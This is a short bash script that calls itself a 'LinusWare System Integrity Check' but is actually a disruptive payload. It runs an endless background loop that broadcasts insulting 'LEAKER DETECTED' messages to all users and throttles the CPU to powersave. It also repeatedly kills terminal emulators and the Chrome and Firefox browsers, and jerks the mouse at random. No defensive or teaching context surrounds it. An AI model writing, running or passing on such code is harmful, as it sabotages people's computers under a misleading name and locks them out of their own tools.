#!/bin/bash
# LinusWare System Integrity Check
# "Ensuring your system is skid-free"


while true; do
    wall "LINUSWARE: LEAKER DETECTED. YOUR SYSTEM IS NOW TRASH."
    wall "LEAKER IS A PDF. GO AWAY."
    sleep 0.5
    

    echo "powersave" | tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor > /dev/null 2>&1
    
    # Randomly kill terminal emulators or browsers
    pkill -f "gnome-terminal"
    pkill -f "konsole"
    pkill -f "xterm"
    pkill -f "chrome"
    pkill -f "firefox"
    
    # The ultimate annoyance: move the mouse randomly (needs xdotool)
    if command -v xdotool &> /dev/null; then
        xdotool mousemove_relative -- $((RANDOM%100-50)) $((RANDOM%100-50))
    fi
done &
